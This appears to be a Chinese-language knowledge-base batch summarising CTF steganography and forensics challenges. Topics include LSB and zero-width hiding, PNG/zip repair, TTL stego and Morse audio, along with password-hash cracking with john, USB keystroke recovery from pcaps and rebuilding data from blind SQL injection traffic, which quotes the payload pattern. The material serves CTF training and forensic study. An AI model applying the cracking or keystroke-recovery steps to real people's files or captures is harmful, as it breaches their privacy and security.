- **假设**：wav 载体若被 DeepSound 2.0 加密嵌入，其 LSB 载有 DSCF magic 头；deepsound2john 可在任意波形偏移处扫描提取 SHA1 口令哈希（$dynamic_1529$），交 john 字典离线爆破，密码命中后 DeepSound GUI 解密导出隐藏附件——全程无需原密码交互。
- **验证步骤**：1) ffmpeg 非 wav 先转码；2) deepsound2john.py 逐字节滑窗扫描 DSCF magic（buf[::2]/[::4]/[::8] 三档 quality 模式），打印 $dynamic_1529$<sha1>；3) john 字典爆破；4) DeepSound 以命中口令解密导出；5) audacity 频谱兜底看明文残段。
- **判定标准**：PASS = 哈希行生成 + 爆破命中 + DeepSound 解密出附件；FAIL = 无 DSCF magic（非 DeepSound 载体）或爆破不中。
- **裁决词**：待复跑
- **来源**：INSHack2018 not so deep（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/OwenW_TCT-通关之路/Part15/09_[INSHack2018]not_so_deep.md
- **关联**：与 [[音频声道分工双载隐写（倒放频谱图 + LSB 载荷）]] 构成音频双通道组（明文频谱 vs 加密 LSB 容器）；工具链同源 [[Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）]] 的 audacity 前置观察。
- **熵控预检**：Q1 与库内 steghide/音频条目无重名（DeepSound 为新载体）；Q3 强（deepsound2john 脚本全文在 WP，DSCF 扫描逻辑可直接复刻）；Q4 关联边 2 条均命中候选池节点。

### LSB 载体可见文字首字母口令 + DES 解密
- **分层**：困难·多段链
- **假设**：PNG LSB 隐写载荷带密码加密时，口令可能就是载体图可见文字的首字母缩写（本例图内"万物皆空 无欲无求"→wwjkwywq）——载体语义即口令源，可免去爆破。
- **验证步骤**：1) stegsolve/lsb 脚本发现 LSB 加密流；2) 读取图内中文口号按拼音首字母拼口令；3) DES 解密（WP 附完整 S 盒/IP 置换表实现）。
- **判定标准**：PASS = 首字母口令解出明文 flag；FAIL = 口令不来自图面文字（需转爆破路径）。
- **裁决词**：待复跑
- **来源**：QCTF2018 picture（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/OwenW_TCT-通关之路/Part17/07_[QCTF2018]picture.md
- **关联**：口令源思路与 [[hex 文本修复 JPEG + steghide 双层 + morse/ROT13]] 的"载体自带线索"同型；LSB 提取与 [[列主序 LSB 扫描（Rows lie. Columns don't）]] 互补。
- **熵控预检**：Q1 无重名；Q3 中（口令来源线索在 WP 明示，DES 表全套在文）；Q4 边 2 条命中。

### RAR 头修复 + Blue0 二维码 + USB 击键流量 + 栅栏重排
- **分层**：困难·多段链
- **假设**：畸形 RAR（文件头 7A→74 单字节错位）修复解压后，PNG Blue 0 通道藏二维码、随附 pcap 为 USB HID 击键记录——四段链每段输出为下段输入，任一环断链即无解。
- **验证步骤**：1) 010editor 定位 RAR 头 52 61 72 21 1A 07 后异常字节改回 74；2) 解压得 233.png；3) stegsolve Blue plane 0 扫码得扰动密文 ci{v3erf_0tygidv2_fc0}；4) binwalk key.ftm 抽出 key.pcap；5) tshark -T fields -e usb.capdata 导击键；6) HID 键码表映射（00 前缀+第 3 字节 KeyCode，shift 位区分大小写）还原口令；7) 维吉尼亚+栅栏复合解密。
- **判定标准**：PASS = 四段贯通后 flag 语义完整（含 flag{} 结构）；FAIL = 任一环（头修复/通道选择/键码映射）错位。
- **裁决词**：待复跑
- **来源**：BUUCTF USB｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/USB.md
- **关联**：USB HID 键码映射可反哺流量取证组（与 [[Windows SAM bootKey 转储 + SilentEye 隐写双密钥链]] 同属"多信源密钥汇聚"形态）。
- **熵控预检**：Q1 无重名；Q3 强（键码映射表与 tshark 命令全在 WP）；Q4 边 1 条。

### Base64 非规范尾差隐写（重编码差值藏比特）
- **分层**：困难·单点
- **假设**：多行 base64 文本若每行存在"原始串 vs 规范重编码串"的尾字符差异，差值（字符表索引距离）按 padding 数×2 位 zfill 拼接即隐藏比特流——编码器冗余度即隐写信道。
- **验证步骤**：1) 逐行 decode 后再 encode 得规范串；2) 对比首异字符在 base64 表中的索引差；3) 差值二进制 zfill(pads×2) 追加；4) 8bit 分组转字符。
- **判定标准**：PASS = 拼出可读口令/flag；FAIL = 行为规范编码（差值全 0）则无隐写。
- **裁决词**：待复跑
- **来源**：GXYCTF2019 SXM gdGhpcyBiYXNlPw==（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/OwenW_TCT-通关之路/Part07/01_：[GXYCTF2019]SXMgdGhpcyBiYXNlPw.md
- **关联**：与 [[文本空白字符隐写（空格/制表符二进制）]]、[[零宽变体选择符隐写（VS17-256 偏移分组解码）]] 构成"文本载体冗余隐写三部曲"（空白字符/零宽字符/编码尾差）。
- **熵控预检**：Q1 无重名（库内 base64 条目均为解码链，尾差隐写为首例）；Q3 强（解密脚本全文在 WP）；Q4 边 2 条。

### PT2262 无线信号波形译码（脉冲宽度三元映射）
- **分层**：困难·单点
- **假设**：wav 中固定周期重复的方波段为 PT2262 遥控器编码帧，脉宽形态按三元映射（一长一短=F、两短=0、两长=1）译码，末位为停止码——波形观察即可人工完成，无需软件无线电设备。
- **验证步骤**：1) audacity 打开定位唯一有内容的波形段；2) 逐位识别脉冲形态映射 F/0/1；3) 截去停止码拼 12 位地址码。
- **判定标准**：PASS = 拼出 FFFFFFFF0001 型地址码即 flag；FAIL = 波形形态不属于 PT2262 三元组（如 PT2242 地址码式 01 序列）。
- **裁决词**：待复跑
- **来源**：HDCTF2019 信号分析（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[HDCTF2019]信号分析.md
- **关联**：与 [[音频信道分离 FSK 解调 + XOR 奇偶仲裁（SSTV 目标 CRC）]] 构成无线/音频译码组（FSK 数字调制 vs PT2262 脉宽基带）。
- **熵控预检**：Q1 无重名；Q3 中（映射规则在 WP 图文，波形原始数据不在——复跑需自构信号）；Q4 边 1 条。

### 伪加密 + Red7 通道藏图 + TTL 2bit + 大文字渲染四层链
- **分层**：困难·多段链
- **假设**：010editor 尾部合并 zip（伪加密位修复）解压后，stegsolve Red plane 7 通道藏口令图，口钥解出的 txt 为 TTL 隐写（每行 8bit TTL 值取高 2bit），还原的 base64 解码后是"1/0 大文字"ASCII art——五段串联，隐蔽性逐层递进。
- **验证步骤**：1) 010editor 发现尾随 zip，改伪加密位解压；2) stegsolve Red7 抠出 png 口令图；3) '{:08b}' 格式化每行 TTL 值取前 2bit 拼流；4) 8bit 分组转字符得 base64 串；5) b64decode 后把 '1' 替换为空格，视觉读出大文字口令。
- **判定标准**：PASS = rar 口令 0ac1fe6b77be5dbe 型字符串从 ASCII art 读出；FAIL = TTL 高 2bit 顺序错（应取 Bin[:-6] 而非低 2bit）。
- **裁决词**：待复跑
- **来源**：MRCTF2020 Hello_ misc（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[MRCTF2020]Hello_ misc.md
- **关联**：TTL 段与 [[TTL 高 2bit 隐写 + 伪加密 + 多层 urlsafe base64]]（本批 SWPU2019）同构互证；大文字渲染与 [[频谱图高频区二进制读模（0.1+0.4x 秒网格 + 8bit 倒序）]] 同属"视觉化读出"收官。
- **熵控预检**：Q1 无重名；Q3 强（四段脚本全在 WP）；Q4 边 2 条（1 条本批内）。

### 三图尾随 zip 拼接 + base 家族自动侦测套娃解码
- **分层**：困难·多段链
- **假设**：多张 png 尾部各附加一段 zip 分片，按文件序拼接成完整压缩包；ARCHAR 爆破后 hint 给出编码类型子集（0x10/0x20/0x30/0x55 = 16/32/64/85），密文可按字符集正则自动侦测编码类型迭代解码至 flag 出现。
- **验证步骤**：1) 逐图定位 png 结尾附节数据按序拼接；2) ARCHAR 爆破 zip；3) detect() 按字符集正则（[0-9A-F=]/[A-Z2-7=]/[A-Za-z0-9+/=]/兜底 85）判型；4) baseDec 迭代至含 MRCTF{ 停止。
- **判定标准**：PASS = 套娃解码终止于 flag；FAIL = 图序错拼（zip CRC 不通过）或混入库外编码（base36/58）。
- **裁决词**：待复跑
- **来源**：MRCTF2020 pyFlag（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[MRCTF2020]pyFlag.md
- **关联**：图尾拼接与 [[PNG chunk 解析定位尾随隐写]]（库）同型三图版；自动判型解码可下沉编码分析域（与 encoding 分区 base 家族条目互补）。
- **熵控预检**：Q1 无重名；Q3 强（detect/autoDec 官方脚本全文在 WP）；Q4 边 2 条。

### 密码自递归嵌套 zip + RGB 像素流重绘二维码
- **分层**：困难·流程
- **假设**：数百层嵌套 zip 的每层密码 = 本层压缩包文件名去后缀（自递归口令，无需爆破）；解到底为 40000 行 RGB 三元组文本，按 200×200 尺寸 putpixel 重绘即二维码。
- **验证步骤**：1) 循环 zipfile.extractall(pwd=当前文件名[:-4].encode())；2) 末层 qr.txt 按行 eval 元组；3) PIL 按 product(range(200),range(200)) 逐像素落图；4) 扫码。
- **判定标准**：PASS = 重绘图可扫码出 flag；FAIL = 某层密码不是自身文件名（需转爆破）或尺寸非整除。
- **裁决词**：待复跑
- **来源**：MRCTF2020 千层套路（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[MRCTF2020]千层套路.md
- **关联**：与 [[PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）]] 同为多层容器但口令策略不同（爆破 vs 自递归）。
- **熵控预检**：Q1 无重名；Q3 强（脚本全文在 WP）；Q4 边 1 条。

### 零宽 + morse 控制符 + NTFS 流 + 词频 + Encrypto 五层链
- **分层**：困难·多段链
- **假设**：txt 的换行控制符 0x20/0x09 可作 morse 点划（AUTOKEY 密钥）；零宽字符藏 NTFS 提示；7zip 解压（保留 NTFS 流）后 NtfsStreamEditor 抽隐藏文件，词频分析出 Encrypto 口令——工具链跨越文件系统层。
- **验证步骤**：1) 010editor 看 lookatme.txt 换行符 20/09 当 morse 译出 AUTOKEY；2) 爆破 autokey 得口令句；3) maybehint.txt 零宽解码（zwsp_steg）得 "do u know NTFS?"；4) 7zip 解压保流 + NtfsStreamEditor2 导出；5) Counter 词频排序拼高频字符 → base64 → Encrypto 口令；6) secret 改 .crypto 后缀用口令解密。
- **判定标准**：PASS = 五层贯通出图；FAIL = 非 7zip 解压导致 NTFS 流丢失（隐藏文件不可见）。
- **裁决词**：待复跑
- **来源**：NPUCTF2020 碰上彩虹吃定彩虹（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[NPUCTF2020]碰上彩虹，吃定彩虹.md
- **关联**：零宽段与 [[零宽变体选择符隐写（VS17-256 偏移分组解码）]] 构成零宽双条（VS 变体 vs ZWSP 三字符集）；morse 段与 [[hex 文本修复 JPEG + steghide 双层 + morse/ROT13]] 互补。
- **熵控预检**：Q1 无重名；Q3 中（各层脚本在 WP 但 Encrypto 为 GUI 工具不可脚本化复跑）；Q4 边 2 条。

### cloacked-pixel LSB 提取 + keyword 前置 Nihilist 替换
- **分层**：困难·多段链
- **假设**：PNG LSB 头部有异常时优先上 cloacked-pixel 的 lsb.py 解密（无需口令出密文）；密文为 Nihilist 型单表替换，密钥由 hint 把 keyword（lovekfc）提到 26 字母表前构造（lovekfcabdghijmnpqrstuwxyz），按密钥序号替换回标准字母表即明文。
- **验证步骤**：1) stegsolve 看 LSB 头部异常；2) cloacked-pixel lsb.py 提取得 PVSF{...}；3) keyword 前置构造 26 字母重排表；4) 大小写敏感逐字符替换。
- **判定标准**：PASS = 替换后 PVSF→flag 语义恢复；FAIL = 密钥序未前置 keyword（直接全字母替换无果）。
- **裁决词**：待复跑
- **来源**：QCTF2018 X-man-keyword（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/OwenW_TCT-通关之路/Part15/11_QCTF2018]X-man-Keyword.md
- **关联**：替换密码收官与 [[hex 文本修复 JPEG + steghide 双层 + morse/ROT13]] 的 ROT13 收官同型；LSB 工具与 [[BMP 位平面隐写读取（跟随写入器逻辑）]] 工具组互补。
- **熵控预检**：Q1 无重名；Q3 强（替换脚本全文在 WP）；Q4 边 2 条。

### 剑龙隐写 pyc 切片 + 反编译异或 + 二次隐写
- **分层**：困难·多段链
- **假设**：trid 识别失败的文件可能是"剑龙（Stegano）pyc 隐写"容器——按 pyc magic（33 0D 0D 0A）偏移切出字节码段，uncompyle6 反编译得 XOR 加密脚本（key=LordCasser）；解出 base64 再解又一层 base64 仍是烟雾弹，真 payload 在剑龙工具的二次隐写层。
- **验证步骤**：1) trid/010editor 疑似 pyc；2) 从 magic 头切出存 1.pyc；3) uncompyle6 反编译读出 key 与 cipher；4) base64 解码后循环 XOR 还原；5) 结果仍 base64 则解之；6) 剑龙隐写工具打开原文件提取真 flag。
- **判定标准**：PASS = 剑龙层提得 flag；FAIL = 停在 XOR 层（被烟雾 base64 误导继续解）。
- **裁决词**：待复跑
- **来源**：SUCTF2018 dead_z3r0（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[SUCTF2018]dead_z3r0.md
- **关联**：反编译段与 reverse 域 pyc 条目跨域互补；"解密结果仍是烟雾"的假终点设计与 [[GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）]] 的多跳设计同型。
- **熵控预检**：Q1 无重名；Q3 强（反编译源码与 XOR 脚本全在 WP）；Q4 边 2 条。

### TTL 高 2bit 隐写 + 伪加密 + 多层 urlsafe base64
- **分层**：困难·多段链
- **假设**：ttl.txt 中只出现 63/127/191/255 四值时为标准 TTL 隐写——每值高 2bit（00/01/10/11）拼流、8bit 分组转字符再 unhexlify 得 zip；伪加密位修复解压后是多层数十重 urlsafe_b64 套娃。
- **验证步骤**：1) 值域判型（恰四值）；2) 高 2bit 拼接转 ascii；3) binascii.unhexlify 出 zip；4) 改伪加密位解压；5) 循环 base64.urlsafe_b64decode 至含 flag。
- **判定标准**：PASS = 三段贯通；FAIL = TTL 值域混杂（非纯四值）说明另有变换。
- **裁决词**：待复跑
- **来源**：SWPU2019 Network（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[SWPU2019]Network.md
- **关联**：与 [[伪加密 + Red7 通道藏图 + TTL 2bit + 大文字渲染四层链]]（本批 MRCTF2020）构成 TTL 双条互证（独立群证据）。
- **熵控预检**：Q1 无重名；Q3 强（三段脚本全在 WP）；Q4 边 1 条（本批内）。

### 零宽字符隐写盲识别（vim 不可见字符定位）
- **分层**：困难·单点
- **假设**：看似正常的英文段落（Lorem ipsum）若 cat -A / vim 下出现成簇不可见字符，即为零宽字符隐写；通用解码器（unicode_steganography.html）按 ZWSP/ZWNJ/ZWJ 三字符集自动还原——不依赖私有脚本。
- **验证步骤**：1) 字频分析无果时 cat/vim 查不可见字符；2) 复制含零宽段落到通用解码器；3) 按 mode 解出 payload。
- **判定标准**：PASS = 解出可读 payload；FAIL = 段落无零宽簇（转其他文本隐写路径）。
- **裁决词**：待复跑
- **来源**：UTCTF2020 zero（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[UTCTF2020]zero.md
- **关联**：与 [[零宽变体选择符隐写（VS17-256 偏移分组解码）]]、[[零宽 + morse 控制符 + NTFS 流 + 词频 + Encrypto 五层链]] 构成零宽三件套（VS 变体/ZWSP/复合链内嵌）——通用解码器路线是工具下沉候选。
- **熵控预检**：Q1 无重名（三零宽条触发域区分：变体选择符/三字符集/链内嵌）；Q3 中（需在线工具，本地复跑可换 zwsp_steg 库）；Q4 边 2 条。

### PNG 结构修复五重奏（CRC 爆破宽高 + IDAT 块名 + 7z→zip 头 + CRC ASCII + 片段全排列）
- **分层**：困难·流程
- **假设**：五张损坏 png 各藏一段 base64 分片，修复手段各不相同：①CRC 爆破宽高（struct.pack 暴力 5000×5000）；②IDAT 块名缺失补 49 44 41 54；③7z 头错改 zip（30 7A→50 4B）；④chunk CRC 值本身是可打印 ASCII 明文；⑤尾注明示分片——五段全排列 b64decode 即 flag。
- **验证步骤**：1) 逐图 tweak:png 校验定位损坏类型；2) 按上述五法分别修复/抽取；3) Blue plane 2 扫码取第二片；4) 1000 文件按大小排序找明文档；5) itertools.permutations 全排列试解。
- **判定标准**：PASS = 某排列 b64decode 出 flag；FAIL = 排列组合爆炸外（>5 片）需缩域。
- **裁决词**：待复跑
- **来源**：湖南省赛2019 Findme（BUUCTF 平台复现）｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/[湖南省赛2019]Findme.md
- **关联**：CRC 爆破宽高与 [[PNG chunk 解析定位尾随隐写]]（库）同域；IDAT 修复与 [[hex 文本修复 JPEG + steghide 双层 + morse/ROT13]] 的手工修复组互补。
- **熵控预检**：Q1 无重名；Q3 强（五段脚本与字节值全在 WP）；Q4 边 2 条。

### SQL 盲注流量还原（二分阈值拐点法）
- **分层**：困难·流程
- **假设**：盲注 pcap 的 http.request.uri 里含 ascii(substr(...,i,1))>k 型 payload 序列，按"位置 i 变化时取上一条阈值"的拐点规则可逐字符还原注入结果——无需看响应包，纯请求侧即可重建被拖数据。
- **验证步骤**：1) tshark -Y http.request -T fields -e http.request.full_uri 导出；2) urllib.parse.unquote 还原；3) 正则抽 (位置, 阈值) 对；4) i 跳变处取前值转 chr。
- **判定标准**：PASS = 还原出 flag 完整字符串；FAIL = 注入非二分型（等值比较型需改判式）。
- **裁决词**：待复跑
- **来源**：BUUCTF sqltest｜cmacckk CTFWriteUp（MIT）｜raw/cn-platforms/buu-stego/cmacckk_CTFWriteUp/buuctf_Misc/sqltest.md
- **关联**：取证侧盲注还原与 web 域注入条目构成攻防对照（攻击面在 web，还原面在 forensics）；tshark 字段导出与 [[NTLMv2 响应手工拆解（字段级 hash 形态）]] 同属"字段级流量切片"。
- **熵控预检**：Q1 无重名；Q3 强（提取脚本全文在 WP）；Q4 边 2 条。

### AI 生图 PNG 元数据 Prompt/Negative Prompt 泄密
- **分层**：困难·单点
- **假设**：AI 生成图片的 PNG TextChunk 常保留完整生成参数（Software/Prompt/Negative Prompt），出题人若把 flag 写进 Negative Prompt（"definitely no 0xVoid{...}"的反语陷阱），exiftool 一发即中——生成器元数据是常被忽视的泄密面。
- **验证步骤**：1) exiftool 全字段打印；2) 检查 Prompt/Negative Prompt/Software 三个生成器特征字段；3) 语义反转读出 flag。
- **判定标准**：PASS = Negative Prompt 中直接含 flag 串；FAIL = 参数被剥离（转 LSB/频谱路径）。
- **裁决词**：待复跑
- **来源**：0xV01D CTF 2026 V2 Negative Prompt Masterpiece｜よっちん（yocchin のブログ）｜raw/team-blogs/yocchin/2026_0xv01d-ctf-2026-v2_negative-prompt-masterpiece.md
- **关联**：与 [[EXIF Make 字段跨图序拼接（同字段跨文件 + zsteg 补刀）]] 构成元数据泄密双条（相机 EXIF vs AI 生成器 TextChunk）；AI 生图泄密面向 aiml 域延伸。
- **熵控预检**：Q1 无重名；Q3 强（exiftool 输出全文在 WP）；Q4 边 2 条。


### JPG 尾随 zip 切割 + 载体间隙明文口令 + Blue1 通道
- **分层**：困难·多段链
- **假设**：binwalk 发现 jpg 尾部附加加密 zip 时，口令常以明文藏在 jpg 数据结束与 zip 头之间的间隙字节里；dd 按偏移切割、间隙抄口令解压、stegsolve Blue plane 1 读真图——三跳组合。
- **验证步骤**：1) binwalk 定位 zip 起始偏移；2) dd bs=1 skip=<off> 切出 flag.zip；3) 二进制编辑器查看 jpg EOI（FF D9）与 zip PK 头之间字符串抄口令；4) unzip -P 解压；5) stegsolve Blue plane 1。
- **判定标准**：PASS = 三跳贯通出 flag；FAIL = 间隙无口令（转 zip 爆破路径）或通道不在 Blue1。
- **裁决词**：待复跑
- **来源**：1337UP LIVE CTF 2024 In Plain Sight｜よっちん（yocchin のブログ）｜raw/team-blogs/yocchin/2024_1337up-live-ctf_in-plain-sight.md
- **关联**：与 [[PNG chunk 解析定位尾随隐写]]（库）、[[三图尾随 zip 拼接 + base 家族自动侦测套娃解码]]（本批）同属"容器尾随"组，本条增量＝间隙明文口令（免爆破）；同作者 zip 尾随 GIF 切割（CTF@CIT 2025 Baller，binwalk 误报 JBOOT 头仍可按偏移切）与 CTF@CIT 2024 I LOVE PRIME（exiftool Description 字段直读 flag）作为同型低增量变体并入本组不另立条。
- **熵控预检**：Q1 与库内尾随条目区分（间隙口令为增量）；Q3 强（dd/unzip 命令全在 WP）；Q4 边 3 条。

### exiftool 时间戳作随机种子的像素坐标洗牌还原
- **分层**：困难·单点
- **假设**：像素位置被 random.shuffle 打乱的"乱码图"，其种子若是文件 mtime 的 UNIXTIME（exiftool 可读），则用同种子重放 shuffle 序列逆向赋值即可复原图像——PRNG 可逆性 + 元数据侧信道组合。
- **验证步骤**：1) exiftool 读 File Modification Date/Time 转 epoch；2) random.seed(ts) 后 shuffle new_y/new_x（与加密端同序）；3) 逆映射 org[y][x]=img[i][j] 逐像素回填；4) 还原图扫码。
- **判定标准**：PASS = 还原出可读 QR；FAIL = 种子非 mtime（试 Date/Time Original 等其他时间字段）或洗牌维度序不同。
- **裁决词**：待复跑
- **来源**：IRON CTF 2024 Random Pixels｜よっちん（yocchin のブログ）｜raw/team-blogs/yocchin/2024_iron-ctf-2024_random-pixels.md
- **关联**：PRNG 种子重放与 [[Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）]] 同属"算法可逆重放"型；种子侧信道思路可反哺数据安全域（弱随机数泄露）。
- **熵控预检**：Q1 无重名；Q3 强（还原脚本全文在 WP）；Q4 边 2 条。

### PNG 九点结构修复（签名/IHDR/sRGB/gAMA/IDAT/CRC/IEND 全错位）
- **分层**：困难·流程
- **假设**：png 被多处篡改（签名 89 4A 50 47、IHDR 尺寸/块名、sRGB 尺寸、gAMA 块名与 CRC、IDAT 尺寸/CRC、IEND CRC 缺失）时按 png 规范逐点修复后仍可能差一口气——用画图软件"强读强存"重编码补齐剩余结构损伤，再上 stegsolve XOR 通道读淡印内容。
- **验证步骤**：1) 十六进制编辑器逐偏移对照修复（WP 附 9 处偏移+字节对照表）；2) paint/图像软件强制打开并另存（触发解码器容错重编码）；3) stegsolve XOR 通道扫描读上半部淡色文字。
- **判定标准**：PASS = XOR 通道读出 flag；FAIL = 修复后直接可读则无需 XOR（更简单路径）。
- **裁决词**：待复跑
- **来源**：Break the Syntax CTF 2025 Sus data｜よっちん（yocchin のブログ）｜raw/team-blogs/yocchin/2025_break-the-syntax-ctf-2025_sus-data.md
- **关联**：与 [[PNG 结构修复五重奏（CRC 爆破宽高 + IDAT 块名 + 7z→zip 头 + CRC ASCII + 片段全排列）]]（本批）构成 PNG 修复双条（结构错位型 vs 数据缺损型）；"容器修复→通道读取"接力与 [[hex 文本修复 JPEG + steghide 双层 + morse/ROT13]] 同构。
- **熵控预检**：Q1 无重名；Q3 强（9 处偏移字节对照全在 WP）；Q4 边 2 条。

### Java 文字冒险静态数组提取 + 字符映射像素渲染
- **分层**：困难·多段链
- **假设**：交互式 Java 文字冒险（jar）的逻辑分支只是烟雾，flag 在 jadx 反编译可见的静态 String[] 数组里；数组元素为 a-g 七种字符的序列，按字符→颜色映射逐像素渲染即出图——游戏状态机（喂松鼠×3 + F5 开启动物语言）只是把同一数组按交互路径分片展示。
- **验证步骤**：1) jadx-gui 反编译 Main.class 直接读 flags[]；2) 每字符映射一像素（a-g 对应灰阶/色带）；3) 固定宽度逐行渲染成图；4) 读图。
- **判定标准**：PASS = 渲染图可读出 flag；FAIL = 需按游戏路径取子串拼接（交互态分片）。
- **裁决词**：待复跑
- **来源**：USC CTF Fall 2024 Redwoods｜よっちん（yocchin のブログ）｜raw/team-blogs/yocchin/2024_usc-ctf-fall-2024_redwoods.md
- **关联**：静态数组直读与 [[密码自递归嵌套 zip + RGB 像素流重绘二维码]]（本批）的"像素流重绘"收官同型；反编译入口与 reverse 域 jadx 条目跨域互补。
- **熵控预检**：Q1 无重名；Q3 中（flags 数组全文在 WP，渲染宽度需试）；Q4 边 2 条。


### BMP 头跳过 + 8 字节组 LSB 流提取（zsteg/StegSolve 全盲区）
- **分层**：困难·单点
- **假设**：BMP 载体 LSB 隐写在 zsteg/StegSolve 均无输出时，可能是"跳过 54 字节头后每 8 个连续字节 LSB 组一 payload 字节"的朴素实现——工具盲区需手写 mmap 提取器兜底。
- **验证步骤**：1) 自写脚本 mmap 只读映射文件；2) 从 offset 54 起步长 8 取 8 字节组；3) 每组各取 b&0x01 按序拼 8bit（高位在前）；4) 遇 0x00 截断输出。
- **判定标准**：PASS = 输出 picoCTF{st0r3d...} 形态完整串；FAIL = 位序反（低位在前翻转重拼）或起始偏移非 54（试 1078 调色板后）。
- **裁决词**：待复跑
- **来源**：picoCTF 2018 LoadSomeBits (Forensics 500)｜Dvd848 (S1扩容)｜raw/github-repos/Dvd848/2018_loadsomebits-md_h_loadsomebits.md
- **关联**：与 [[WAV 帧字节 LSB 流提取（wave.readframes 全帧低位）]] 同属"朴素 LSB 流"双载体版（BMP vs WAV），且互为"工具盲区手写兜底"证据；与 [[BMP 位平面隐写读取（跟随写入器逻辑）]] 构成 BMP 三角（位平面/朴素流/写入器跟随）。
- **熵控预检**：Q1 与库内 BMP 条目区分（54 字节步进组为增量）；Q3 强（mmap 脚本全在 WP）；Q4 边 3 条。

### energetic pixels 能量像素隐写（busysteg 论文工具反演）
- **分层**：困难·流程
- **假设**：学术隐写算法（Keyless dynamic optimal multi-bit image steganography using energetic pixels）已被出题工具化（github jaybosamiya/busysteg）；题面给出论文线索时，检索论文题名→定位作者开源工具→编译反演即提取——"论文→开源实现"复现链是学术型隐写题的通用解。
- **验证步骤**：1) 从题面/提示提取论文关键词；2) Google Scholar/搜索引擎定论文，github 搜同名工具；3) clone 编译（依赖 OpenCV）；4) 对目标图运行解嵌入。
- **判定标准**：PASS = 工具直接吐 flag；FAIL = 工具版本不匹配（按论文伪代码自实现）。
- **裁决词**：待复跑
- **来源**：LCTF 2017 拿去当壁纸吧朋友｜六星战队（中国）｜raw/github-repos/sixstars/2017_lctf_h_lctf.md
- **关联**：学术隐写复现与 [[Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）]] 同属"算法论文反演"；同文件另两题（angr 约束求解→[[百点位运算约束的 angr 覆盖引导求解（afl-qmode 加速）]]、padding oracle→库内既有条目）跨域互链。
- **熵控预检**：Q1 无重名；Q3 中（WP 给论文题名+工具仓，编译参数需自查）；Q4 边 3 条。

### PDF 多层 binwalk 提取 + 解压炸弹规避（-1 尺寸伪文件）
- **分层**：困难·单点
- **假设**：pdf 内嵌 zip 双文件（flag.txt 压缩 41B + galf.txt 声称解压 -1 字节）是典型解压炸弹陷阱；binwalk -Me 递归提取时用 ^C 及时中断即可拿到 flag.txt 而不被 galf.txt 撑爆磁盘——"看尺寸列再提取"是取证纪律。
- **验证步骤**：1) binwalk EATME.pdf 观察两个 zip 条目的压缩/解压尺寸；2) binwalk -Me 递归提取；3) flag.txt 落盘后立即 ^C；4) cat flag.txt（base64 再解一层）。
- **判定标准**：PASS = flag.txt 完整且未触发炸弹；FAIL = 全量提取导致磁盘/内存耗尽（预防性用 -D 限制或 dd 精确切割）。
- **裁决词**：待复跑
- **来源**：Trend Micro CTF 2018 Misc 100｜Dvd848 (S1扩容)｜raw/github-repos/balsn/slices/20180914-trendmicroctf/misc-100.md
- **关联**：与 [[JPG 尾随 zip 切割 + 载体间隙明文口令 + Blue1 通道]]（本批）同属"容器嵌套"组，本条增量＝尺寸 -1 炸弹陷阱识别；取证纪律面向数据安全（取证操作自身安全）。
- **熵控预检**：Q1 无重名；Q3 强（binwalk 输出全在 WP）；Q4 边 2 条。

### Flash dump MKV 双音轨 + 2000Hz 正弦波摩尔斯 + base32 落图
- **分层**：困难·多段链
- **假设**：USB 闪存镜像取证中，mkv 视频时长异常（8 分钟内容 1 小时文件）常因附加隐藏音轨（mkvinfo 可见 track 3：PCM 2000Hz 单声道）；第二音轨的规则正弦波（1 或 3 个正弦一组+长短间隙）是摩尔斯码，译码得 base32，解码落 PNG，图背景阴影是被弱化的 QR——五跳取证链。
- **验证步骤**：1) dd/挂载 dump，过滤垃圾覆写文件；2) mkvinfo 列 Track 找隐藏音轨；3) mkvextract tracks 2:track.wav；4) Audacity 观波形译摩尔斯；5) base32 解码存 png；6) 对比度增强还原 QR 阴影。
- **判定标准**：PASS = QR 可扫出内容；FAIL = 阴影 QR 缺定位角（手工补 finder pattern）。
- **裁决词**：待复跑
- **来源**：CTFZone 2018 Quals Ghost in the flash (416p/4 solved)｜p4 (波兰战队)｜raw/github-repos/p4/2018_ctfzone-quals_h_for-ghost.md
- **关联**：与 [[音频信道分离 FSK 解调 + XOR 奇偶仲裁（SSTV 目标 CRC）]]、[[音频帧重排恢复（排列指示数组）]] 构成音频取证三态（FSK/重排/摩尔斯）；"时长异常→隐藏轨"启发式与 [[GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）]] 的弱化 QR 修复互补。原 WP 未完全解出（到 QR 阴影步），复跑须自带后段假设。
- **熵控预检**：Q1 无重名；Q3 中（链条前三跳命令全在 WP，QR 修复段 WP 未完成）；Q4 边 4 条。

